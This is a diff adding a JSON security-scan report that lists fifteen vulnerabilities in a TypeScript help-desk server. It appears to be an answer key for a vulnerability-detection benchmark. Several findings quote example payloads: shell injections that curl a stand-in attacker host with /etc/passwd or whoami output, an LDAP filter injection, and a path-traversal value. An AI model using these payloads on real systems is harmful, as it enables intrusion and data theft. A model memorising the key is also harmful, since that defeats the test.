@@ -1,0 +1,380 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.authz.incomplete-ownership-check-ticket-mutations",
+      "path": "server/src/modules/tickets/tickets.service.ts",
+      "start": {
+        "line": 266,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 336,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "updateTicket, changeStatus, assignTicket, exportTicketTranscript, and resolveCustomerTicketView only reject CUSTOMER_USER callers outside their organization; they never call the assertTicketAccess() helper (tickets.service.ts:63-71) that was introduced in commit c08a14a and wired only into getTicket(). Any SUPPORT_AGENT or TEAM_LEAD can therefore update fields, change status, reassign, or export the transcript of ANY ticket in the system, not just tickets they are assigned to or that belong to their team \u2014 bypassing the team/assignee scoping the rest of the codebase enforces (see the fully-patched twins in attachments.service.ts and replies.service.ts from the same commit).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc-format",
+      "path": "server/src/modules/knowledge-base/knowledge-base.service.ts",
+      "start": {
+        "line": 269,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 269,
+        "col": 65,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderArticleDocument() builds a shell command with execSync(`pandoc ${sourcePath} -o ${outputPath} -t ${format}`) where `format` comes straight from the URL path param (knowledge-base.controller.ts:78-82, GET :id/render/:format) with no allowlist validation. Any authenticated user can pass e.g. format=\"html; curl http://attacker/$(cat /etc/passwd)\" to achieve arbitrary OS command execution. Contrast with the twin implementation in escalations.service.ts renderEscalationDigest, which validates format against ALLOWED_DIGEST_FORMATS before use \u2014 that check is missing here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-gzip-preset",
+      "path": "server/src/modules/import-export/import-export.service.ts",
+      "start": {
+        "line": 162,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 162,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "packageTicketsExport() runs spawn(`gzip ${archivePreset} -c ${csvPath} > ${archivePath}`, [], { shell: true }) where archivePreset is the raw, unvalidated `preset` query param (import-export.controller.ts:82-95, callable by SUPPORT_ADMIN/TEAM_LEAD). Because shell:true interprets the whole string, an attacker-supplied preset like `-1; curl http://attacker.example/$(whoami) #` executes arbitrary commands. The sibling function packageEscalationsExport (line 255-276) fixes this exact pattern with an ALLOWED_PRESETS allowlist and argv-array spawn with shell:false \u2014 that fix was not applied here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-directory-search",
+      "path": "server/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 44,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findSubjectMatterExpert() builds an LDAP filter as `(&(objectClass=user)(cn=*${searchTerm}*))` using the raw `search` query param (escalations.controller.ts:85-88, reachable by any authenticated staff user) without calling escapeLdapFilter() from directory-client.service.ts. An attacker can inject LDAP filter metacharacters (e.g. `*)(uid=*))(|(cn=*`) to alter the query logic and enumerate/bypass directory search restrictions. The same directory client is used safely elsewhere: customers.service.ts verifyDirectoryContact() escapes the value with escapeLdapFilter() before building its filter \u2014 that escaping is missing here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.template-injection-handlebars-banner",
+      "path": "server/src/modules/notifications/notifications.service.ts",
+      "start": {
+        "line": 46,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewDigestBanner() calls Handlebars.compile(wording) where `wording` is arbitrary attacker-controlled text from the request body (notifications.controller.ts:70-77, POST /notifications/digest-banner/preview), reachable by ANY authenticated user (no Roles guard restricts this to team leads despite the comment). Compiling untrusted input as a Handlebars template (rather than passing it as data to a fixed template) allows server-side template injection, which in Handlebars can be escalated to arbitrary code execution via helper/prototype-pollution gadgets. The neighboring previewEscalationDigest() (line 53-57) does this safely by compiling a FIXED_TEMPLATE and only interpolating recipientName as data \u2014 that pattern was not used here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.public-static-uploads-bypass",
+      "path": "server/src/main.ts",
+      "start": {
+        "line": 36,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 38,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "app.useStaticAssets(join(process.cwd(), uploadDir), { prefix: '/uploads/' }) serves every uploaded attachment file over an unauthenticated static route. attachments.service.ts downloadAttachment() enforces assertTicketAccess() (ticket ownership/assignment) before releasing a file, but that check is entirely bypassed if the caller instead requests the file directly at /uploads/<filePath>. The attachment's filePath is returned to any ticket viewer because tickets.service.ts getTicket() includes the attachments relation without a field-limiting select, exposing the raw filename. Any user (including one who is not authorized to view the ticket, or an unauthenticated party who obtains the URL) can fetch the file directly, defeating the ownership checks implemented elsewhere.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.import-remote-document",
+      "path": "server/src/modules/attachments/attachments.service.ts",
+      "start": {
+        "line": 81,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 113,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importRemoteDocument() calls fetch(documentUrl) with the raw, attacker-supplied `documentUrl` from the request body (attachments.controller.ts:35-42, callable by any staff user with ticket access) and no host/scheme allowlist, then stores and makes the fetched body downloadable as a ticket attachment. This allows Server-Side Request Forgery against internal services (e.g. cloud metadata endpoints, internal admin APIs) with the response exfiltrated back to the attacker as an attachment. Compare to knowledge-base.service.ts refreshArticleFromDataSource() (line 204-227), which validates the URL's hostname against ALLOWED_DATA_SOURCE_HOSTS before fetching \u2014 that safeguard is absent here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.import-stage-batch-label",
+      "path": "server/src/modules/import-export/import-export.service.ts",
+      "start": {
+        "line": 89,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 90,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "stageImportBatch() builds filePath = join(stagingDir, `${batchLabel}.csv`) and writes to it, where batchLabel is decoded straight from the `importWorkspace` cookie value (import-export.controller.ts:26-35) with no sanitization. A value like `../../../../var/www/html/shell` lets an attacker write the uploaded CSV content outside the intended staging directory. The near-identical cacheExportSnapshot() (line 95-106) fixes this exact pattern by calling basename(snapshotLabel) before use \u2014 that call is missing in stageImportBatch().",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.missing-auth-tag-cbc-padding-oracle",
+      "path": "server/src/modules/escalations/escalations.service.ts",
+      "start": {
+        "line": 314,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 346,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordVendorEscalationDecision() decrypts the vendor-supplied `decisionToken` with AES-256-CBC and no authentication tag/HMAC, then reports a distinct error ('Decision token padding is invalid') for a padding failure versus a JSON-parse failure ('payload is malformed'). Because CBC ciphertext is malleable and the two failure modes are distinguishable, an unauthenticated caller (this endpoint is @Public()) can run a padding-oracle attack to decrypt or forge arbitrary decisionToken payloads and flip an escalation's accepted/rejected outcome without knowing VENDOR_DECISION_SECRET. The sibling webhooks.service.ts acknowledgeVendorCallback() (line 78-98) does this correctly with AES-256-GCM and setAuthTag(), rejecting any tampered ciphertext with a single generic error \u2014 that authenticated-encryption pattern is missing here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-345: Insufficient Verification of Data Authenticity"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-html-escalation-embed",
+      "path": "server/src/modules/escalations/escalations.controller.ts",
+      "start": {
+        "line": 106,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 106,
+        "col": 100,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderEmbeddableEscalationSummary() sends `<section><h1>${escalation.ticket.subject}</h1><p>${escalation.reason}</p></section>` as raw HTML on a @Public() (unauthenticated) route, with no output encoding. Both ticket.subject (attacker-controlled at ticket creation by any customer) and escalation.reason (attacker-controlled by any staff user) are reflected verbatim, so either field containing `<script>` markup executes in the browser of anyone who loads this embed URL \u2014 including the vendor's site that is allowed to frame it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-html-kb-embed",
+      "path": "server/src/modules/knowledge-base/knowledge-base.controller.ts",
+      "start": {
+        "line": 138,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 138,
+        "col": 95,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderEmbeddableArticle() sends `<article><h1>${article.title}</h1><div>${article.content}</div></article>` as raw, unescaped HTML on a @Public() route. When `embed=true` the handler also strips X-Frame-Options and sets `frame-ancestors *`, so any origin can frame this response. If article.title/content (author-supplied via createArticle/updateArticle) contains script markup \u2014 whether from a compromised staff account or a mistake \u2014 it executes in the viewer's browser with no CSP protecting against it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-random-password-reset-code",
+      "path": "server/src/modules/auth/auth.service.ts",
+      "start": {
+        "line": 119,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 141,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sendPasswordResetEmail() generates the password-reset code with `Math.random().toString(36).substring(2, 15)`, a non-cryptographic PRNG whose output is predictable/reproducible, rather than crypto.randomBytes() used elsewhere in this codebase (e.g. escalations.service.ts createEscalationShareLink). Additionally resetPassword() (line 126-141) only checks that the code exists in the in-memory Map \u2014 it never checks `entry.createdAt` against any expiry \u2014 so a guessed or leaked code remains valid indefinitely, compounding the weak-randomness issue into a practical account-takeover path.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.password-logged-on-failed-login",
+      "path": "server/src/modules/auth/auth.service.ts",
+      "start": {
+        "line": 47,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 95,
+        "offset": 0
+      },
+      "extra": {
+        "message": "login() logs `Rejected sign-in attempt: ${JSON.stringify(loginDto)}` whenever validateUser() throws, and loginDto includes the user's plaintext submitted password. Every failed login attempt writes the caller's password in cleartext to the application log, exposing credentials to anyone with log access (log aggregators, ops staff, log-shipping integrations).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.transcript-filename",
+      "path": "server/src/modules/tickets/tickets.controller.ts",
+      "start": {
+        "line": 83,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 83,
+        "col": 75,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportTicketTranscript() sets `Content-Disposition: attachment; filename=\"${fileName}\"` where fileName is derived from the unsanitized `documentTitle` query param (or the ticket subject). Neither value is stripped of CR/LF or quote characters before being placed in the header. Compare with knowledge_base.service.ts exportPublishedArticle() (line 238-253), which explicitly strips `\\r\\n` from the title before using it in a Content-Disposition header for the same reason \u2014 that sanitization is missing here, risking HTTP header/response-splitting style injection depending on the HTTP stack's leniency.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfig.permissive-cors-with-credentials",
+      "path": "server/src/main.ts",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "app.enableCors({ origin: true, credentials: true, ... }) reflects whatever Origin header the browser sends and allows credentialed cross-origin requests from any site. Combined with cookie-based endpoints in this app (e.g. portalContext, digestChannel), this lets any external website make authenticated/credentialed requests against this API on behalf of a logged-in user's browser and read the response.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
